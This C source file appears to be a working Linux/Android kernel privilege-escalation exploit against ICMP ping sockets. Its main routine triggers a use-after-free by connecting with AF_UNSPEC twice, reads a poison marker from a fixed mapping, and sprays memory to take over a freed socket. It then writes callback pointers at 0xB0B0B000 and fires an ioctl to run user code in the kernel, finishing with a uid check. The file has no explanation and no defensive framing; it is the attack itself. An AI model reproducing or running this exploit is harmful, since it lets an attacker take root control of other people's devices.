#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <sys/mman.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <arpa/inet.h>
#include <fcntl.h>
#include <sys/wait.h>

#define CHILD_PROCESS_FDS 		0x32
#define PARENT_PROCESS_FDS 		0x1F4
#define POSION_ADDR__PTR		((unsigned int*)(0x00200000 + 0x200))

int gSockFds[PARENT_PROCESS_FDS] = {0};
int* mmapAddrParentWaitChild = NULL;
int* mmapAddrChildWaitParent = NULL;
void* shareAddrPoison = NULL;
void* mmapAdddrTarget = NULL;
unsigned int posionValues[PARENT_PROCESS_FDS] = {0};
unsigned int posionCalculateValues[PARENT_PROCESS_FDS] = {0};
void* mmapsAddr[0x64] = {0};

void initProcessSt();
int callback() ;

extern int filesStructInTaskStructCnt;
extern int testStructCnt;
extern int testMaxFdsCnt;

int callbackFunc(int fd){
	typedef void (*PrintkFunc)(const char* fmt, ...);
	PrintkFunc func = (PrintkFunc)0xc094a274U;
	func("----------------------------------------------\n");
	func("----------------------------------------------\n");
	func("i am gl\n");
	func("----------------------------------------------\n");
	func("----------------------------------------------\n");
	func("----------------------------------------------\n");
	return 0x12345678;
}

int findKernelCodeAddr(unsigned int *result){
	FILE* fp;
	char szLine[0x100];
	unsigned int startAddr;
	unsigned int endAddr;
	char szLabel0[128];
	char szLabel1[128];
	char szLabel2[128];
	int res = -1;

	fp = fopen("/proc/iomem", "rt");

	while( fgets(szLine, sizeof(szLine)-1, fp) ){
		sscanf(szLine, "%x-%x %s %s %s", &startAddr, &endAddr, szLabel0, szLabel1, szLabel2);

		if( 0 == strcmp(szLabel0, ":") &&
				0 == strcasecmp(szLabel1, "Kernel") &&
				( 0 == strcasecmp(szLabel2, "code") || 0 == strcasecmp(szLabel2, "text") ) ){
				*result = startAddr & 0xF0000000;
				res = 0;
				break;
		}
	}
	fclose(fp);
	return res;
}
int getFreeMemSizeKB(const char* lpStr){
	int var0_3;
	char var4_403[0x400];
	int var404_408;
	FILE* fp;
	int len;
	char* lpDigit;
	char* lpEnd;
	int ret = -1;

	//var404_408 = dword_2DAF8;
	memset(var4_403, 0, sizeof(var4_403));

	fp = fopen("/proc/meminfo", "r");

	if( NULL == fp ){
		return -1;
	}

	len = strlen(lpStr);
	while( fgets(var4_403, sizeof(var4_403), fp) ){
		if( 0 == memcmp(lpStr, var4_403, len) ){
			lpDigit = var4_403;
			while( ' ' != *lpDigit ){ lpDigit++; }
			while( ' ' == *lpDigit ){ lpDigit++; }
			lpEnd = lpDigit;
			while( ' ' != *lpEnd ){ lpEnd++; }
			*lpEnd = 0;
			ret = atoi(lpDigit);
			break;
		}
	}

	return ret;
}
int getFreeMemFlag(){
	int freeKb ;
	int freeMemFlag;

	freeKb = getFreeMemSizeKB("MemFree");
	printf("freeKb=%dKB\n", freeKb);

	if( freeKb < 0 ){
		freeKb += 0xFF00;
		freeKb += 0xFF;
	}
	freeKb = freeKb >> 16;
	freeKb = freeKb << 1;

	if(freeKb < 7){
		freeMemFlag = 8;
	}else if( freeKb >= 0x64 ){
		freeMemFlag = 0x64;
	}else{
		freeMemFlag = freeKb;
	}
	printf("freeMemFlag=%d\n", freeMemFlag);
	return freeMemFlag;
}

int mem_addr_vir2phy(unsigned int vir, unsigned int *phy){
    int fd;
    int page_size=getpagesize();
    unsigned long vir_page_idx = vir/page_size;
    unsigned long pfn_item_offset = vir_page_idx*sizeof(uint64_t);
    uint64_t pfn_item;

#define    PFN_MASK          ((((uint64_t)1)<<55)-1)
#define    PFN_PRESENT_FLAG  (((uint64_t)1)<<63)

    fd = open("/proc/self/pagemap", O_RDONLY);
    if (fd<0){
        printf("open %s failed\n", "/proc/self/pagemap");
        return -1;
    }

    if ((off_t)-1 == lseek(fd, pfn_item_offset, SEEK_SET)){
        printf("lseek %s failed\n", "/proc/self/pagemap");
        close(fd);
        return -1;
    }

    if (sizeof(uint64_t) != read(fd, &pfn_item, sizeof(uint64_t))){
        printf("read %s failed\n", "/proc/self/pagemap");
        close(fd);
        return -1;
    }


    if (0==(pfn_item & PFN_PRESENT_FLAG)){
        printf("page is not present");
        close(fd);
        return -1;
    }


    *phy = (pfn_item & PFN_MASK)*page_size + vir % page_size;
    close(fd);

    return 0;
}

int initMmaps(){
	mmapAddrParentWaitChild = (int*)mmap(NULL, 0x4, 0x3/*PROT_READ | PROT_WRITE*/, 0x21/*MAP_ANONYMOUS | MAP_SHARED*/, -1, 0x0);
	mmapAddrChildWaitParent = (int*)mmap(NULL, 0x4, 0x3/*PROT_READ | PROT_WRITE*/, 0x21/*MAP_ANONYMOUS | MAP_SHARED*/, -1, 0x0);
	shareAddrPoison = mmap((void*)0x00200000, 0x00010000, 0x3/*PROT_READ | PROT_WRITE*/, 0x31/*MAP_ANONYMOUS | MAP_SHARED | MAP_FIXED*/, -1, 0x0);
	mmapAdddrTarget = mmap((void*)0xB0000000, 0x01000000, 0x7/*PROT_READ | PROT_WRITE | PROT_EXEC*/, 0x31/*MAP_ANONYMOUS | MAP_SHARED | MAP_FIXED*/, -1, 0x0);
	//mmapAdddrTarget = mmap((void*)0xB0B0B000, 0x00001000, 0x7/*PROT_READ | PROT_WRITE | PROT_EXEC*/, 0x31/*MAP_ANONYMOUS | MAP_SHARED | MAP_FIXED*/, -1, 0x0);

	if( -1 == (int)mmapAddrParentWaitChild || -1 == (int)mmapAddrChildWaitParent ||
			-1 == (int)shareAddrPoison || -1 == (int)mmapAdddrTarget){
		return -1;
	}
	*mmapAddrParentWaitChild =  0;
	*mmapAddrChildWaitParent = 0;
	memset(shareAddrPoison, 0, 0x00010000);
	memset(mmapAdddrTarget, 0, 0x01000000);
	//memset(mmapAdddrTarget, 0, 0x00001000);
	return 0;
}
int createChildSockets(){
	int sockFds[CHILD_PROCESS_FDS] = {0};

	for(int i=0; i<CHILD_PROCESS_FDS; i++){
		sockFds[i] = socket(0x2/*AF_INET*/, 0x2/*SOCK_DGRAM*/, 0x1/*IPPROTO_ICMP*/);
		if( -1 == sockFds[i] ){
			printf("failed to child socket\n");
		}
	}
	printf(".");

	while(*mmapAddrChildWaitParent <= 0){
		sleep(1);
	}

	for(int i=0; i<CHILD_PROCESS_FDS; i++){
		if( sockFds[i] > 0 ){
			close(sockFds[i]);
		}
	}
	printf("-");

	return 0;
}

void releaseMmaps(){
	if( -1 != (int) mmapAddrParentWaitChild ){
		munmap(mmapAddrParentWaitChild, 0x4);
	}
	if( -1 != (int) mmapAddrChildWaitParent ){
		munmap(mmapAddrChildWaitParent, 0x4);
	}
	if( -1 != (int) shareAddrPoison ){
		munmap(shareAddrPoison, 0x00010000);
	}
	if( -1 != (int) mmapAdddrTarget ){
		munmap(mmapAdddrTarget, 0x01000000);
		//munmap(mmapAdddrTarget, 0x00001000);
	}
}

void fillData(){
	*(unsigned int*)(0xB0B0B000U+0xB0) = (unsigned int)callbackFunc;
	*(unsigned int*)(0xB0B0B000U+0xB4) = (unsigned int)callbackFunc;
	*(unsigned int*)(0xB0B0B000U+0xB8) = (unsigned int)callbackFunc;
	*(unsigned int*)(0xB0B0B000U+0xBC) = (unsigned int)callbackFunc;
	*(unsigned int*)(0xB0B0B000U+0xC0) = (unsigned int)callbackFunc;
	*(unsigned int*)(0xB0B0B000U+0xC4) = (unsigned int)callbackFunc;
	*(unsigned int*)(0xB0B0B000U+0xC8) = (unsigned int)callbackFunc;
	*(unsigned int*)(0xB0B0B000U+0xCC) = (unsigned int)callbackFunc;
	*(unsigned int*)(0xB0B0B000U+0xD0) = (unsigned int)callbackFunc;
	*(unsigned int*)(0xB0B0B000U+0xD4) = (unsigned int)callbackFunc;

	*(unsigned int*)(0xB0B0B000U+0xB0) = (unsigned int)callback;
	*(unsigned int*)(0xB0B0B000U+0xB4) = (unsigned int)callback;
	*(unsigned int*)(0xB0B0B000U+0xB8) = (unsigned int)callback;
	*(unsigned int*)(0xB0B0B000U+0xBC) = (unsigned int)callback;
	*(unsigned int*)(0xB0B0B000U+0xC0) = (unsigned int)callback;
	*(unsigned int*)(0xB0B0B000U+0xC4) = (unsigned int)callback;
	*(unsigned int*)(0xB0B0B000U+0xC8) = (unsigned int)callback;
	*(unsigned int*)(0xB0B0B000U+0xCC) = (unsigned int)callback;
	*(unsigned int*)(0xB0B0B000U+0xD0) = (unsigned int)callback;
	*(unsigned int*)(0xB0B0B000U+0xD4) = (unsigned int)callback;
	sync();
}
int findItByPagemap(void* addr, int nPages, int* sockFds, int nSize){
	unsigned int phyAddr = -1;
	struct timespec timeSt1;


	for(int j=0; j<nPages; j++){
		if( 0 != mem_addr_vir2phy((unsigned int)addr+j*0x1000, &phyAddr)){
			printf("failed get phyaddr\n");
			return -1;
		}
		for(int i=0; i<nSize; i++){
			//printf("posionCalculateValues[i]=%x, phyAddr=%x\n",
			//		posionCalculateValues[i], phyAddr);
			//if( 0 == posionCalculateValues[i] || posionCalculateValues[i] < phyAddr || posionCalculateValues[i] > phyAddr + 0x1000 ){}
			if( 0 == posionCalculateValues[i]  ){
				continue;
			}
			/*if( !( posionCalculateValues[i] >= phyAddr && posionCalculateValues[i] <= phyAddr + 0x1000 ) &&
					!( posionValues[i] >= phyAddr && posionValues[i] <= phyAddr + 0x1000 ) ){
				continue;
			}*/
			if( !( posionCalculateValues[i] >= phyAddr && posionCalculateValues[i] <= phyAddr + 0x1000 ) ){
				continue;
			}
			timeSt1.tv_sec = 0;
			timeSt1.tv_nsec=0;
			if( 0 != ioctl(sockFds[i], 0x8907, &timeSt1) ){
				//printf("ioctl failed\n");
				continue;
			}
			if(timeSt1.tv_sec != 0xAB5DF2C9 &&
					timeSt1.tv_sec != 0xB0B0B0B0){
				continue;
			}
			printf("%d=CalculateValue=%x, Value=%x, phyAddr=%x, tv_sec=%x\n",
					i, posionCalculateValues[i], posionValues[i], phyAddr, (unsigned int)timeSt1.tv_sec);
			return sockFds[i];
		}
	}
	return -1;
}
int findItBySockOpt(void* addr, int nPages, int* sockFds, int nSize){
	unsigned int sockOptValue = 0;
	int sockOptLen = 4;

	for(int i=0; i<nSize; i++){
		sockOptValue = 0;
		sockOptLen = 4;
		if( -1 == getsockopt(sockFds[i], 1/*SOL_SOCKET*/, 0xC/*SO_PRIORITY*/, &sockOptValue, &sockOptLen)
				|| 0 == sockOptValue){
			continue;
		}
		if(0xB0B0B0B0U != sockOptValue){
			continue;
		}
		 printf("%d=0x%x\n", i, sockOptValue);
		 return sockFds[i];
	}
	return -1;
}

int createParentSockets(int* sockFds, int nSize){
	int pid;

	for(int i=0;i<nSize;i++){
		sockFds[i] = socket(0x2/*AF_INET*/, 0x2/*SOCK_DGRAM*/, 0x1/*IPPROTO_ICMP*/);
		if( -1 == sockFds[i] ){
			printf("failed to parent socket\n");
			return -1;
		}
		pid = fork();
		if(pid < 0){
			printf("failed to fork\n");
			return -1;
		}
		if( 0 == pid ){
			createChildSockets();
			exit(0);
		}
		usleep(0xFA0);
	}
	return 0;
}

int main(){
	struct sockaddr sockAddrSt0;
	int firstConnect0Flag = 0;
	unsigned int kernelCodeAddr = -1;
	int freeMemFlag ;
	int isHasFsSelinux = 0;		//TODO
	unsigned int* targetAddr = NULL;
	int collipseCount = 0;
	int targetSockFd = -1;
	char szData[64] = {0};

	setbuf(stdout, NULL);

	initProcessSt();

	if( -1 == initMmaps() ){
		printf("failed to mmap\n");
		return -1;
	}

	*POSION_ADDR__PTR = 0xDEADBEEFU;

	if( -1 == findKernelCodeAddr(&kernelCodeAddr) || -1 == kernelCodeAddr){
		//TODO
		printf("failed to get kernelCodeAddr\n");
		return -1;
	}

	//lifting sockets
	if( 0 != createParentSockets(gSockFds, PARENT_PROCESS_FDS) ){
		printf("failed to lifting\n");
		return -1;
	}

	sleep(3);
	printf("\n");
	printf("***lifting ok\n\n");

	//do connect sa_family=AF_INET
	for(int i=0; i<PARENT_PROCESS_FDS; i++){
		if( gSockFds[i] > 0){
			memset(&sockAddrSt0, 0, sizeof(sockAddrSt0));
			sockAddrSt0.sa_family = 2;/*AF_INET*/
			if( -1 == connect(gSockFds[i], &sockAddrSt0, sizeof(sockAddrSt0)) ){
				printf("failed to connect sa_family=AF_INET\n");
				return -1;
			}
		}
	}
	printf("***connect sa_family=AF_INET ok\n\n");

	//do connect sa_family=AF_UNSPEC
	firstConnect0Flag = 0;
	for(int i=PARENT_PROCESS_FDS-1; i>=0; i--){
		if( gSockFds[i] > 0){
			memset(&sockAddrSt0, 0, sizeof(sockAddrSt0));
			sockAddrSt0.sa_family = 0;/*AF_UNSPEC*/
			if( -1 == connect(gSockFds[i], &sockAddrSt0, sizeof(sockAddrSt0)) ){
				printf("failed to connect sa_family=AF_UNSPEC once\n");
				return -1;
			}
			if( -1 == connect(gSockFds[i], &sockAddrSt0, sizeof(sockAddrSt0)) ){
				printf("failed to connect sa_family=AF_UNSPEC twice\n");
				return -1;
			}
			//printf("*POSION_ADDR__PTR=%x\n", *POSION_ADDR__PTR);
			if( 0 == firstConnect0Flag ){
				if( 0xDEADBEEFUL == *POSION_ADDR__PTR ){
					printf("0xDEADBEEFUL == *POSION_ADDR__PTR, after i connect two\n");
					return -1;
				}else{
					firstConnect0Flag = 1;
				}
			}
			if( *POSION_ADDR__PTR < 0xC0000000U ||
					i <= 0x3F){
				continue;
			}
			posionValues[i] = *POSION_ADDR__PTR;
			posionCalculateValues[i] = *POSION_ADDR__PTR + kernelCodeAddr + 0x40000000;
			//printf("%d= %x, %x\n", i, posionValues[i], posionCalculateValues[i]);
		}
	}

	printf("***connect sa_family=AF_UNSPEC ok\n\n");

	*mmapAddrChildWaitParent = 1;
	sleep(1);
	while( wait(NULL) >0 ){}
	printf("\n");
	printf("***wait ok\n\n");
	sleep(1);


	freeMemFlag = getFreeMemFlag();

	for(int i=0; i<freeMemFlag; i++){
		mmapsAddr[i] = mmap(NULL, 0x04000000, 0x3/*PROT_READ | PROT_WRITE*/, 0x21/*MAP_ANONYMOUS | MAP_SHARED*/, -1, 0);
		if( -1 == (int)mmapsAddr[i] ){
			continue;
		}
		memset(mmapsAddr[i], 0xB0, 0x04000000);
		sync();
		if(isHasFsSelinux){
			printf("findItByPagemap\n");
			if( (targetSockFd=findItByPagemap(mmapsAddr[i], 0x04000000/0x1000, gSockFds, PARENT_PROCESS_FDS)) > 0 ){
				targetAddr = (unsigned int*)mmapsAddr[i];
				mmapsAddr[i] = 0;
				printf("collipsed (%d)!! %d=0x%p\n", ++collipseCount, i, targetAddr);
				break;
			}
		}else{
			printf("findItBySockOpt\n");
			if(  (targetSockFd=findItBySockOpt(mmapsAddr[i], 0x04000000/0x1000, gSockFds, PARENT_PROCESS_FDS)) > 0){
				targetAddr = (unsigned int*)mmapsAddr[i];
				mmapsAddr[i] = 0;
				printf("collipsed (%d)!! %d=0x%p\n", ++collipseCount, i, targetAddr);
				break;
			}
		}
	}
	printf("***collipse ok\n\n");
	sleep(1);


	for(int i=0; i<freeMemFlag; i++){
		if( (int)mmapsAddr[i] > 0 ){
			munmap(mmapsAddr[i], 0x04000000);
		}
	}
	printf("***release collipse mmaps ok\n\n");


	if(-1 != targetSockFd){
		printf("get target sock fd ok\n");
		fillData();

		if( -1 == ioctl(targetSockFd, 0xABCD, szData)){
			printf("failed to ioctl\n");
		}

		printf("fill data ok\n\n");
	}
	printf("***set it ok\n\n");

	releaseMmaps();
	printf("***release mmaps ok\n\n");

	printf("uid = %d\n", getuid());
	printf("filesStructInTaskStructCnt=%d, testStructCnt=%d, testMaxFdsCnt=%x\n",
			filesStructInTaskStructCnt, testStructCnt, testMaxFdsCnt);

	for(int i=0; i<PARENT_PROCESS_FDS; i++){
		if( gSockFds[i] > 0){
			close(gSockFds[i]);
			fflush(stdout);
		}
	}

	printf("***close ok\n\n");


	printf("***over\n\n");
	return 0;
}
